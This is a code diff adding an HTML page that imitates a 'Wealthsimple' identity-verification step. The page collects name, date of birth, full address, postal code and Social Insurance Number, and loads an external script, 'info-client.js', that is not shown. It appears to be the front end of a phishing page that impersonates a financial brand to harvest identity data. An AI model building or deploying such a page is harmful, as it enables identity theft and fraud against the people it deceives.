@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Information</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #87CEEB 0%, #B0E0E6 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 9.6px;
+            padding: 48px 64px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 33.6px;
+            font-weight: 400;
+            color: #2C3E50;
+            margin-bottom: 32px;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .form-group {
+            margin-bottom: 19.2px;
+        }
+
+        label {
+            display: block;
+            font-size: 11.2px;
+            font-weight: 500;
+            color: #5A6C7D;
+            margin-bottom: 6.4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12.8px 16px;
+            font-size: 12.8px;
+            border: 2px solid #E0E0E0;
+            border-radius: 40px;
+            transition: all 0.3s ease;
+            color: #2C3E50;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #2C3E50;
+        }
+
+        input:hover {
+            border-color: #A0A0A0;
+        }
+
+        .date-inputs {
+            display: flex;
+            gap: 9.6px;
+        }
+
+        .date-field {
+            flex: 1;
+        }
+
+        .date-field input {
+            text-align: center;
+        }
+
+        .date-field.day,
+        .date-field.month {
+            max-width: 64px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: #2C3E50;
+            border: none;
+            border-radius: 40px;
+            padding: 16px 32px;
+            font-size: 14.4px;
+            font-weight: 500;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 25.6px;
+        }
+
+        .submit-btn:hover {
+            background: #1A2634;
+            transform: translateY(-1.6px);
+            box-shadow: 0 4.8px 16px rgba(44, 62, 80, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .logo {
+            font-size: 19.2px;
+            font-weight: 700;
+            color: #2C3E50;
+            position: absolute;
+            top: 24px;
+            left: 32px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 32px 24px;
+            }
+
+            h1 {
+                font-size: 25.6px;
+            }
+
+            input {
+                padding: 11.2px 14.4px;
+                font-size: 12px;
+            }
+
+            .submit-btn {
+                font-size: 12.8px;
+                padding: 12.8px 25.6px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">Wealthsimple</div>
+    
+    <div class="container">
+        <h1>Verify the following<br>information</h1>
+        
+        <form>
+            <div class="form-group">
+                <label for="name">First and last name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+
+            <div class="form-group">
+                <label>Date of birth</label>
+                <div class="date-inputs">
+                    <div class="date-field day">
+                        <input type="text" id="day" name="day" placeholder="DD" inputmode="numeric" required>
+                    </div>
+                    <div class="date-field month">
+                        <input type="text" id="month" name="month" placeholder="MM" inputmode="numeric" required>
+                    </div>
+                    <div class="date-field year">
+                        <input type="text" id="year" name="year" placeholder="YYYY" inputmode="numeric" required>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="city">City</label>
+                <input type="text" id="city" name="city" required>
+            </div>
+
+            <div class="form-group">
+                <label for="province">Province</label>
+                <input type="text" id="province" name="province" required>
+            </div>
+
+            <div class="form-group">
+                <label for="address">Street address</label>
+                <input type="text" id="address" name="address" required>
+            </div>
+
+            <div class="form-group">
+                <label for="postal">Postal code</label>
+                <input type="text" id="postal" name="postal" required>
+            </div>
+
+            <div class="form-group">
+                <label for="sin">SIN (social insurance number)</label>
+                <input type="text" id="sin" name="sin" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Continue</button>
+        </form>
+    </div>
+
+    <script>
+        // Auto-advance to next field when 2 digits are entered
+        const dayInput = document.getElementById('day');
+        const monthInput = document.getElementById('month');
+        const yearInput = document.getElementById('year');
+
+        dayInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 2);
+            if (this.value.length === 2) {
+                monthInput.focus();
+            }
+        });
+
+        monthInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 2);
+            if (this.value.length === 2) {
+                yearInput.focus();
+            }
+        });
+
+        yearInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+    </script>
+
+    <!-- Include the info-client.js script -->
+    <script src="info-client.js"></script>
+</body>
+</html>
